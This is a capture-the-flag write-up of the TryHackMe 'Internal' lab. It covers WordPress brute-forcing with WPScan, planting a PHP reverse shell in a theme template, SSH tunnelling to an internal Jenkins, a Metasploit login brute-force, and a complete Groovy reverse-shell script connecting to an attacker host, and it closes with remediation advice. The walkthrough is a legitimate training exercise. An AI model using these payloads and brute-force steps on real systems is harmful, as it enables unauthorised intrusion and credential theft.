---
title:  "TryHackMe - Internal Writeup"
search: true
categories: 
  - TryHackMe
  - Write-Ups
  - Linux
last_modified_at: 2020-08-25T08:05:34-05:00
---
![alt text](https://i.imgur.com/9yN2I9x.png "Internal Pic")

Difficulty Rating: Hard

Creator: [@TheMayor](https://tryhackme.com/p/TheMayor)

Internal is supposed to be a 'Penetration Testing Challenge' that simulates a security engineer conducting an external, web app, and internal assessment of the provided virtual environment. 

# Summary 
***
- WordPress Admin had a weak password.
- Found plain text credentials on WordPress Server
- Exploited an Internal Jenkins Instance to gain access to a Docker Container
- Found plain text credentials to root on the Docker Container


# Enumeration
***
Before we start let's update our `/etc/hosts/` file to map the `internal.thm` domain to the Machine IP.
![alt text](https://i.imgur.com/eMnmF1H.png "/etc/hosts update")


As always, we start with a port scan to reveal open ports on the network.

**AutoRecon:**
![alt text](https://i.imgur.com/Ilozm59.png "AutoRecon Scan")

AutoRecon shows us that port 22 (SSH) is open and port 80 (HTTP) is open.

Let's see what's running on port 80: 
![alt text](https://i.imgur.com/YkYeryJ.png "Webpage")

It looks like a default apache welcome page is running. We should probably enumerate the directories to find some more information about the application.

**Dirsearch:**
```
python3 dirsearch.py -u http://10.10.151.247 -e *

[22:36:14] 301 -  313B  - /blog  ->  http://10.10.151.247/blog/                                                   
[22:36:16] 200 -    4KB - /blog/wp-login.php                            
[22:36:30] 200 -   11KB - /index.html                                                                          
[22:36:31] 301 -  319B  - /javascript  ->  http://10.10.151.247/javascript/
[22:36:42] 301 -  319B  - /phpmyadmin  ->  http://10.10.151.247/phpmyadmin/                             
[22:36:44] 200 -   10KB - /phpmyadmin/  
```
Dirsearch found multiple directories that we can now work with. Visiting the `/blog` directory brings us to a WordPress installation.
![alt text](https://i.imgur.com/cWSf8Bw.jpg "WordPress Installation")

`/blog/wp-login.php:`
![alt text](https://i.imgur.com/6c0yC44.png "Login Portal")

Navigating around the blog doesn't seem to provide any value. The next step in this enumeration phase is finding a valid user that can login to gain access to the WordPress Admin Panel.


**WPScan:**
```
root@kali:~/Desktop/THM/Internal# wpscan --url http://10.10.151.247/blog --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.151.247/blog/ [10.10.151.247]
[+] Started: Mon Aug 24 22:44:56 2020

Interesting Finding(s):

...

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=====================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

We found a valid user: `admin`

Let's use WPScan again to brute-force the login page and gain administrative access to the WordPress CMS.

```
root@kali:~/Desktop/THM/Internal# wpscan --url http://internal.thm/blog/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.151.247]
[+] Started: Mon Aug 24 22:57:09 2020

Interesting Finding(s):

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / m*****ys                                           
```

`/blog/wp-admin/`
![alt text](https://i.imgur.com/6hITmCC.png "Admin Panel")
Now that we're authenticated as admin, we can edit, view, and delete any post or even upload a reverse shell!

While browsing, I noticed a Private "To-Do List" post by `admin.`
![alt text](https://i.imgur.com/rTVZbg4.png "Private Post")
It looks like we found credentials for a user named `william`.

# Initial Access
***
Since we have administrative access to the WordPress installation, we can upload PHP code to the server to gain a remote shell on our attacker machine. Head over to `http://internal.thm/blog/wp-admin/theme-editor.php` and place a [PHP Reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) into the `404.php` template.
![alt text](https://i.imgur.com/Byq9Zuk.png "Reverse Shell")

Now click 'Update File.'

Next, we want to setup a netcat listener on our attacker machine:
```
root@kali:~/Desktop/THM/Internal# nc -nlvp 1234
listening on [any] 1234 ...
```

Now everything is in place to gain a shell. Execute the PHP reverse shell by visiting the following URL `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`. Our listener should've received a connection from the server:
![alt text](https://i.imgur.com/rf0MbXV.png "Netcat Shell")

Let's spawn a [TTY Shell](https://netsec.ws/?p=337):
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

# Privilege Escalation (User)
***
Navigating around the fileshare, I found an interesting file called `wp-save.txt`.
```
$ cat wp-save.txt

Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bu******23

```
We found creds for `Aubreanna`! Let's use these to SSH into the machine and gain a more stable shell.

```
ssh aubreanna@internal.thm
```
![alt text](https://i.imgur.com/hAN9rsm.png "SSH & User Flag")

Along with the user flag in Aubreanna's home directory, we have a `jenkins.txt` file.

# Privilege Escalation (Root)
***
```
$ cat jenkins.txt 

Internal Jenkins service is running on 172.17.0.2:8080
```
It looks like we're going to have to utilize SSH Port Forwarding to access this Internal Jenkins Instance running through Docker.

To setup the SSH Port-Forward run the following command on our kali machine:

```
$ ssh -L 9000:localhost:8080 aubreanna@internal.thm
```
[FalconSpy](https://twitter.com/0xFalconSpy) has a great post explaining [SSH Port-Forwarding/Tunneling.](https://medium.com/@falconspy/oscp-understanding-ssh-tunnels-519e31c698bf)

Now, if we visit `localhost:9000` in our browser, the Jenkins Instance should pop up.
![alt text](https://i.imgur.com/ASV9qnz.png "Jenkins Instance")

None of the credentials that we've gathered worked on this login page. So it looks like we're going to have to brute-force some new ones. Using the Metasploit module `auxiliary/scanner/http/jenkins_login`, we can enumerate a valid credential pair that will allow us access to the `Jenkins Server.`

```
msf5 auxiliary(scanner/http/jenkins_login) > set USERNAME admin
USERNAME => admin
msf5 auxiliary(scanner/http/jenkins_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf5 auxiliary(scanner/http/jenkins_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf5 auxiliary(scanner/http/jenkins_login) > set RHOSTS localhost
RHOSTS => localhost
msf5 auxiliary(scanner/http/jenkins_login) > set RPORT 9000
RPORT => 9000
msf5 auxiliary(scanner/http/jenkins_login) > run
...
[+] 127.0.0.1:9000 - Login Successful: admin:sp*****ob
```

Using the credentials, we just found we are now able to authenticate with the Jenkins application successfully. Upon first glance, it seems there is no build history for us to see, so our next move is to try to gain code execution on the server running this Jenkins Application. 

If we navigate to `Manage Jenkins --> Script Console`, we will be able to execute an arbitrary [Groovy Script](http://www.groovy-lang.org/) and gain a [reverse shell](https://github.com/gquere/pwn_jenkins#reverse-shell-from-groovy). 

Reverse Shell for Groovy Console:
```
String host="10.10.X.X";
int port=4444;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
Before running the script, make sure to setup a listener on your machine.
![alt text](https://i.imgur.com/3g9J0X9.png "Netcat Listener Jenkins")

```
$cd /opt
$cat note.txt

Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr*********123
```

Now we have credentials to the `root` account, let's try to SSH in.

```
$ ssh root@internal.thm

root@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
...
Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
root@internal:~# 
```
![alt text](https://i.imgur.com/wpv9jvD.png "Root Flag")

# Remediations
***
**WordPress Application**
- WordPress Admin password length should be greater than or equal to 15 characters.
- Disable XMLRPC.php so attackers can't enumerate users.
- Never store credentials in WordPress post.

**WordPress Server**
- Don't store user credentials in plaintext on server filesystem.

**Jenkins (Docker Container)**
- Jenkins Admin password length should be greater than or equal to 15 characters.
- Don't store credentials in plain text, even if the filesystem is 'secure' / 'segregrated' in a virtual environment. 


> Side Note: DB credentials to the WordPress Server were found on the server machine. If the WordPress site had a more extensive user database, then this could've lead to more passwords being found to use within the network. 